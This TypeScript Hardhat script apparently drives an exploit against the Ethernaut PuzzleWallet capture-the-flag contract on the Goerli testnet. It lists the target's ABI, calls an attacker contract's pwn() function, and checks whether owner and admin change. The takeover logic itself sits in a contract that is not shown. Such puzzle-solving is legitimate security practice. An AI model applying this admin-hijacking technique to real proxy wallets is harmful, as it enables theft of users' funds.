import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x361b29Cb1A5cc1B9509819CedC4C3419D7e417F1"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "addr",
          type: "address",
        },
      ],
      name: "addToWhitelist",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xe43252d7",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      name: "balances",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x27e235e3",
    },
    {
      inputs: [],
      name: "deposit",
      outputs: [],
      stateMutability: "payable",
      type: "function",
      payable: true,
      signature: "0xd0e30db0",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
        {
          internalType: "bytes",
          name: "data",
          type: "bytes",
        },
      ],
      name: "execute",
      outputs: [],
      stateMutability: "payable",
      type: "function",
      payable: true,
      signature: "0xb61d27f6",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_maxBalance",
          type: "uint256",
        },
      ],
      name: "init",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xb7b0422d",
    },
    {
      inputs: [],
      name: "maxBalance",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x73ad468a",
    },
    {
      inputs: [
        {
          internalType: "bytes[]",
          name: "data",
          type: "bytes[]",
        },
      ],
      name: "multicall",
      outputs: [],
      stateMutability: "payable",
      type: "function",
      payable: true,
      signature: "0xac9650d8",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_maxBalance",
          type: "uint256",
        },
      ],
      name: "setMaxBalance",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x9d51d9b7",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      name: "whitelisted",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xd936547e",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_newAdmix",
          type: "address",
        },
      ],
      name: "proposeNewAdmin",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xa6376746",
    },
    {
      inputs: [],
      name: "admin",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xf851a440",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("PuzzleWallet")

  console.log("check owner", await target.owner())
  console.log("check admin", await target.admin())

  const tx = await contract.pwn(targetAddress, {
    value: ethers.utils.parseEther("0.001"),
    gasLimit: 3000000,
  })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log("check owner", await target.owner())
  console.log("check admin", await target.admin())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
